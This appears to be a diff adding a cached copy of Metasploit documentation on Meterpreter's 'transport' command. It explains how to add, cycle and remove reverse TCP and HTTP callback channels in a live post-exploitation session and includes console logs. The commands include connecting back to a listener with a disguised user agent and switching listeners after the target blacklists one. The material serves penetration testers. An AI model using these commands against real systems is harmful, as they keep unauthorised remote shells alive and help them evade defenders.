@@ -1,0 +1,347 @@
+I"Pw<p>The Meterpreter that we have known and loved for years has always had the ability to specify the type of transport that is to be used for the session. <code class="highlighter-rouge">reverse_tcp</code> and <code class="highlighter-rouge">reverse_https</code> appear to be the favourites. While this is very useful, the flexibility for transport selection has only been available at the time the payloads are created, or the exploit is launched, effectively locking the Meterpreter session into a single type of transport for the entire session lifetime.</p>
+
+<p>Recent modifications to Meterpreter have changed this. Meterpreter has a new <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter%27s-Configuration">configuration system</a> that supports multiple transports, and behind the scenes it now supports the addition of new transports <em>on the fly while the session is still running</em>. With the extra transports configured, Meterpreter allows the user to cycle through those transports without shutting down the session.</p>
+
+<p>Not only that, but Meterpreter will cycle through these transports automatically when communication fails. For more information on the session resiliency features, please view the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication">Reliable Network documentation</a>.</p>
+
+<p>This document describes how multiple transports are added on the fly to an existing Meterpreter session.</p>
+
+<h2 id="transport-configuration">Transport configuration</h2>
+
+<p>At this point in time it is not possible to add multiple transports to payloads or exploits prior to launching them. This is due to the fact that <code class="highlighter-rouge">msfvenom</code> the built-in payload mechanisms in Metasploit need to be modified to allow for multiple transports to be selected prior to the generation of the payload. This work is ongoing, and hopefully it’ll be implemented soon. In the mean time, a single transport has to be chosen, using the same mechanism that has always been in use.</p>
+
+<h2 id="the-transport-command">The <code class="highlighter-rouge">transport</code> command</h2>
+
+<p>Meterpreter now has a new base command called <code class="highlighter-rouge">transport</code>. This is the hub of all transport-related commands and will allow you to list them, add new ones, cycle through them on the fly, and remove those which are no longer valid or useful.</p>
+
+<p>The following output shows the current help text for the <code class="highlighter-rouge">transport</code> command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport
+Usage: transport &lt;list|change|add|next|prev|remove&gt; [options]
+
+   list: list the currently active transports.
+    add: add a new transport to the transport list.
+ change: same as add, but changes directly to the added entry.
+   next: jump to the next transport in the list (no options).
+   prev: jump to the previous transport in the list (no options).
+ remove: remove an existing, non-active transport.
+
+OPTIONS:
+
+    -A &lt;opt&gt;  User agent for HTTP/S transports (optional)
+    -B &lt;opt&gt;  Proxy type for HTTP/S transports (optional: http, socks; default: http)
+    -C &lt;opt&gt;  Comms timeout (seconds) (default: same as current session)
+    -H &lt;opt&gt;  Proxy host for HTTP/S transports (optional)
+    -N &lt;opt&gt;  Proxy password for HTTP/S transports (optional)
+    -P &lt;opt&gt;  Proxy port for HTTP/S transports (optional)
+    -T &lt;opt&gt;  Retry total time (seconds) (default: same as current session)
+    -U &lt;opt&gt;  Proxy username for HTTP/S transports (optional)
+    -W &lt;opt&gt;  Retry wait time (seconds) (default: same as current session)
+    -X &lt;opt&gt;  Expiration timout (seconds) (default: same as current session)
+    -c &lt;opt&gt;  SSL certificate path for https transport verification (optional)
+    -h        Help menu
+    -i &lt;opt&gt;  Specify transport by index (currently supported: remove)
+    -l &lt;opt&gt;  LHOST parameter (for reverse transports)
+    -p &lt;opt&gt;  LPORT parameter
+    -t &lt;opt&gt;  Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp
+    -u &lt;opt&gt;  Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)
+    -v        Show the verbose format of the transport list
+
+
+</code></pre></div></div>
+
+<p>Clearly there’s quite a few nuances to this command, and the best way to explain them is with a set of examples.</p>
+
+<h3 id="listing-transports">Listing transports</h3>
+
+<p>The simplest of all the sub-commands in the <code class="highlighter-rouge">transport</code> set is <code class="highlighter-rouge">list</code>. This command shows the full list of currently enabled transport, and an indicator of which one is the “current” transport. The following shows the non-verbose output with just the default transport running:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                    ---------  -----------  ----------
+    *     tcp://10.1.10.40:6000  300        3600         10
+</code></pre></div></div>
+
+<p>The first part of the output is the session expiry time. Details of what this is and why it’s relevant can be found in the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control">Timeout documentation</a>.</p>
+
+<p>The above output shows that we have one transport enabled that is using <code class="highlighter-rouge">TCP</code>. We can infer that the transport was a <code class="highlighter-rouge">reverse_tcp</code> (rather than <code class="highlighter-rouge">bind_tcp</code>) due to the fact that there is a host IP address in the transport URL. If it was a <code class="highlighter-rouge">bind_tcp</code>, this would be blank.</p>
+
+<p><code class="highlighter-rouge">Comms T/O</code> refers to the communications timeout value. <code class="highlighter-rouge">Retry Total</code> is the total time to attempt reconnects on this transport, and <code class="highlighter-rouge">Retry Wait</code> indicates how often a retry of the current transport should happen. Each of these is documented in depth in the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control">Timeout documentation</a>.</p>
+
+<p>The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as <code class="highlighter-rouge">reverse_http/s</code>). The following command shows the output of the <code class="highlighter-rouge">list</code> sub-command with the verbose flag (<code class="highlighter-rouge">-v</code>) after an <code class="highlighter-rouge">HTTP</code> transport has been added:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport list -v
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait  User Agent               Proxy Host  Proxy User  Proxy Pass  Cert Hash
+    ----  ---                                                                                                    ---------  -----------  ----------  ----------               ----------  ----------  ----------  ---------
+    *     tcp://10.1.10.40:6000                                                                                  300        3600         10                                                                       
+          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500        Totes-Legit Browser/1.1                                      
+</code></pre></div></div>
+
+<h3 id="adding-transports">Adding transports</h3>
+
+<p>Adding transports is the hot new thing. It gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added.</p>
+
+<p>The following command shows a simple example that adds a <code class="highlighter-rouge">reverse_http</code> transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
+[*] Adding new transport ...
+[+] Successfully added reverse_http transport.
+</code></pre></div></div>
+
+<p>This command is what was used to create the transport that was listed in the sample verbose output for the <code class="highlighter-rouge">transport list</code> command. Here’s a deeper explanation of the parameters:</p>
+
+<ul>
+  <li>The <code class="highlighter-rouge">-t</code> option is what tells Metasploit what type of transport to add. The options are <code class="highlighter-rouge">bind_tcp</code>, <code class="highlighter-rouge">reverse_tcp</code>, <code class="highlighter-rouge">reverse_http</code> and <code class="highlighter-rouge">reverse_https</code>. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no <code class="highlighter-rouge">reverse_winhttps</code> because Meterpreter always uses the WinHTTP API behind the scenes anyway.</li>
+  <li>The <code class="highlighter-rouge">-l</code> option specifies what we all know as the <code class="highlighter-rouge">LHOST</code> parameter.</li>
+  <li>The <code class="highlighter-rouge">-p</code> option specifies what we all know as the <code class="highlighter-rouge">LPORT</code> parameter.</li>
+  <li>The <code class="highlighter-rouge">-T</code> option matches the <code class="highlighter-rouge">retry total</code> parameter. The measure of this value is in seconds, and should be a positive integer that is more than <code class="highlighter-rouge">-W</code>.</li>
+  <li>The <code class="highlighter-rouge">-W</code> option matches the <code class="highlighter-rouge">retry wait</code> parameter. The measure of this value is in seconds, and should be a positive integer that is less than <code class="highlighter-rouge">-T</code>.</li>
+  <li>The <code class="highlighter-rouge">-C</code> option matches the <code class="highlighter-rouge">communication timeout</code>. The measure of this value is in seconds, and should be a positive integer.</li>
+  <li>The <code class="highlighter-rouge">-A</code> specifies a custom user agent that is used for HTTP requests.</li>
+</ul>
+
+<p>It is also possible to specify the following:</p>
+
+<ul>
+  <li>The <code class="highlighter-rouge">-u</code> option allows the addition of a local URI (<code class="highlighter-rouge">LURI</code>) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI.</li>
+  <li>The <code class="highlighter-rouge">-H</code> option specifies a proxy host/IP. This parameter is optional.</li>
+  <li>The <code class="highlighter-rouge">-B</code> option specifies a proxy type, and needs to be set to <code class="highlighter-rouge">http</code> or <code class="highlighter-rouge">socks</code>. If not specified alongside the <code class="highlighter-rouge">-H</code> parameter, the default type is <code class="highlighter-rouge">http</code>.</li>
+  <li>The <code class="highlighter-rouge">-P</code> option specifies the port that the proxy is listening on. This should be set when <code class="highlighter-rouge">-H</code> is set.</li>
+  <li>The <code class="highlighter-rouge">-U</code> option specifies the username to use to authenticate with the proxy. This parameter is optional.</li>
+  <li>The <code class="highlighter-rouge">-N</code> option specifies the password to use to authenticate with the proxy. This parameter is optional.</li>
+  <li>The <code class="highlighter-rouge">-X</code> option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use.</li>
+  <li>Finally the <code class="highlighter-rouge">-c</code> parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in <code class="highlighter-rouge">PEM</code> format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn’t exist, or doesn’t contain a valid certificate, then the request should fail.</li>
+</ul>
+
+<p>The following shows another example which adds another <code class="highlighter-rouge">reverse_tcp</code> transport to the transport list:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport add -t reverse_tcp -l 10.1.10.40 -p 5005
+[*] Adding new transport ...
+[+] Successfully added reverse_tcp transport.
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
+          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+          tcp://10.1.10.40:5005                                                                                  300        3600         10
+</code></pre></div></div>
+
+<p>Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the <em>end</em> of the list, and not the start.</p>
+
+<h3 id="changing-transports">Changing transports</h3>
+
+<p>There are three different ways to change transports, each of which has it’s own nuance. However, one thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no such listener/handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport in the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the <strong>session resiliency documentation</strong> (link coming soon).</p>
+
+<p>The three different ways to change transports are:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">transport next</code> - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports.</li>
+  <li><code class="highlighter-rouge">transport prev</code> - This command is the same as <code class="highlighter-rouge">transport next</code>, except that it will move to the <em>previous</em> transport in the list, and not the next one.</li>
+  <li><code class="highlighter-rouge">transport change ...</code> - This command is functionally equivalent to running <code class="highlighter-rouge">transport add</code>, and hence requires all the parameters that <code class="highlighter-rouge">transport add</code> requires (resulting in a new transport at the end of the list), and then <code class="highlighter-rouge">transport prev</code> (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it.</li>
+</ul>
+
+<p>As an example, here is the current transport setup:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
+          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+          tcp://10.1.10.40:5005                                                                                  300        3600         10
+</code></pre></div></div>
+<p>Moving to the next transport:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport next
+[*] Changing to next transport ...
+[+] Successfully changed to the next transport, killing current session.
+
+[*] 10.1.10.35 - Meterpreter session 1 closed.  Reason: User exit
+msf exploit(handler) &gt; 
+[*] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
+[*] Meterpreter session 2 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46130) at 2015-06-02 20:53:54 +1000
+
+msf exploit(handler) &gt; sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+          tcp://10.1.10.40:5005                                                                                  300        3600         10
+          tcp://10.1.10.40:6000                                                                                  300        3600         10
+</code></pre></div></div>
+<p>This output shows that we moved from the original <code class="highlighter-rouge">reverse_tcp</code> to the <code class="highlighter-rouge">reverse_http</code> transport, and this is now the current transport.</p>
+
+<p>Moving to the next transport again takes the session to the second <code class="highlighter-rouge">reverse_tcp</code> listener:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport next
+[*] Changing to next transport ...
+[+] Successfully changed to the next transport, killing current session.
+
+[*] 10.1.10.35 - Meterpreter session 2 closed.  Reason: User exit
+msf exploit(handler) &gt; [*] Meterpreter session 3 opened (10.1.10.40:5005 -&gt; 10.1.10.35:49277) at 2015-06-02 20:54:45 +1000
+
+msf exploit(handler) &gt; sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:06
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     tcp://10.1.10.40:5005                                                                                  300        3600         10
+          tcp://10.1.10.40:6000                                                                                  300        3600         10
+          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+</code></pre></div></div>
+<p>From here, moving backwards sends Meterpreter back to the <code class="highlighter-rouge">reverse_http</code> listener:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport prev
+[*] Changing to previous transport ...
+
+[*] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
+[+] Successfully changed to the previous transport, killing current session.
+
+[*] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit
+msf exploit(handler) &gt; [*] Meterpreter session 4 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46245) at 2015-06-02 20:55:07 +1000
+
+msf exploit(handler) &gt; sessions -i 4
+[*] Starting interaction with 4...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+          tcp://10.1.10.40:5005                                                                                  300        3600         10
+          tcp://10.1.10.40:6000                                                                                  300        3600         10
+</code></pre></div></div>
+
+<h3 id="removing-transports">Removing transports</h3>
+
+<p>It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on <em>stageless</em> listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by your target as a result of your post-exploitation shenanigans.</p>
+
+<p>The command is similar to <code class="highlighter-rouge">add</code> in that it takes a subset of the parameters, and then adds a new one on top of it:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">-t</code> - The transport type.</li>
+  <li><code class="highlighter-rouge">-l</code> - The <code class="highlighter-rouge">LHOST</code> value (unless it’s <code class="highlighter-rouge">bind_tcp</code>).</li>
+  <li><code class="highlighter-rouge">-p</code> - The <code class="highlighter-rouge">LPORT</code> value.</li>
+  <li><code class="highlighter-rouge">-u</code> - This value is only required for <code class="highlighter-rouge">reverse_http/s</code> transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Starting interaction with 2...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-07-10 07:39:08
+
+    Curr  URL                                                                                                             Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                             ---------  -----------  ----------
+    *     tcp://10.1.10.40:5000                                                                                           300        3600         10
+          http://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/  300        3600         10
+
+meterpreter &gt; transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ
+[*] Removing transport ...
+[+] Successfully removed reverse_http transport.
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-07-10 07:39:08
+
+    Curr  URL                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                    ---------  -----------  ----------
+    *     tcp://10.1.10.40:5000  300        3600         10
+
+meterpreter &gt; 
+</code></pre></div></div>
+
+<h3 id="resilient-transports">Resilient transports</h3>
+
+<p>Prior to the recent changes, Meterpreter only had built-in resiliency in the <code class="highlighter-rouge">HTTP/S</code> payloads and this was due the nature of <code class="highlighter-rouge">HTTP/S</code> as a stateless protocol. Meterpreter now has resiliency features baked into <code class="highlighter-rouge">TCP</code> transports as well, both <code class="highlighter-rouge">reverse</code> and <code class="highlighter-rouge">bind</code>. If communication fails on a given transport, Meterpreter will roll over to the next one automatically.</p>
+
+<p>The following shows Metasploit being closed and leaving the existing <code class="highlighter-rouge">TCP</code> session running behind the scenes:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
+          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+          tcp://10.1.10.40:5005                                                                                  300        3600         10
+
+meterpreter &gt; background
+[*] Backgrounding session 5...
+msf exploit(handler) &gt; exit -y
+</code></pre></div></div>
+<p>With Metasploit closed, the Meterpreter session has detected that the transport is no longer functioning. Behind the scenes, Meterpreter has shut down this <code class="highlighter-rouge">TCP</code> transport, and has automatically moved over to the <code class="highlighter-rouge">HTTP</code> transport as this was the next transport in the list. From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings.</p>
+
+<p>The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfconsole -r ~/msf.rc
+[*] Starting the Metasploit Framework console...|
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]
++ -- --=[ 1460 exploits - 835 auxiliary - 229 post        ]
++ -- --=[ 426 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+... snip ...
+
+[*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
+[*] Meterpreter session 1 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000
+
+msf exploit(handler) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                           Connection
+  --  ----                   -----------                           ----------
+  1   meterpreter x86/win32  WIN-S45GUQ5KGVK\OJ @ WIN-S45GUQ5KGVK  10.1.10.40:5105 -&gt; 10.1.10.40:46457 (10.1.10.35)
+
+msf exploit(handler) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-06-09 19:56:05
+
+    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
+    ----  ---                                                                                                    ---------  -----------  ----------
+    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
+          tcp://10.1.10.40:5005                                                                                  300        3600         10
+          tcp://10.1.10.40:6000                                                                                  300        3600         10
+</code></pre></div></div>
+<p>The session is back up and running as if nothing had gone wrong.</p>
+
+<p>In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter’s transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there’s a list of <em>one</em> transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both <code class="highlighter-rouge">TCP</code> and <code class="highlighter-rouge">HTTP/S</code>.</p>
+
+<p>For important detail on network resiliency, please see the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication">reliable network communication documentation</a>.</p>
+
+<h2 id="supported-meterpreters">Supported Meterpreters</h2>
+
+<p>The following Meterpreter implementations currently support the transport commands:</p>
+
+<ul>
+  <li>Windows x86</li>
+  <li>Windows x64</li>
+  <li>POSIX x86</li>
+  <li>Android</li>
+  <li>Java</li>
+  <li>Python</li>
+</ul>
+
+:ET
